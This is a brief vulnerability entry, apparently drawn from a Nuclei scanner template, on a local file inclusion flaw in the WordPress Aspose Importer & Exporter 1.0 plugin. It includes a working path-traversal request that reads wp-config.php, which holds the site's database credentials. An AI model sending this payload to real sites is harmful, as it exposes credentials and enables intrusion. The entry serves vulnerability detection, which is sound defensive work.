# Vulnerability: WordPress Aspose Importer & Exporter 1.0 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`aspose-ie-file-download.yaml`)

## Description
WordPress Aspose Importer & Exporter version 1.0 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php
```

